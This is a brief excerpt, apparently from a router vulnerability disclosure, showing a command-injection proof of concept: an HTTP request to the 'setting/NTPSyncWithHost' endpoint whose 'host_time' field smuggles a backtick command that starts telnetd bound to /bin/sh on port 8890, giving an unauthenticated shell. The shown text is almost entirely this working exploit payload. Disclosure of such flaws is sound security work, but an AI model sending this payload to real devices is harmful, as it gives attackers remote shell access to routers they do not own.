...
We set `host_time` as **’`telnetd -l /bin/sh -p 8890`‘** , and the router will excute it,such as:
...
Referer: http://192.168.0.33/adm/ntp.asp?timestamp=1777256136571
Cookie: SESSION_ID=2:1777255848:2

{"topicurl":"setting/NTPSyncWithHost","host_time":"'`telnetd -l /bin/sh -p 8890`'"}
```
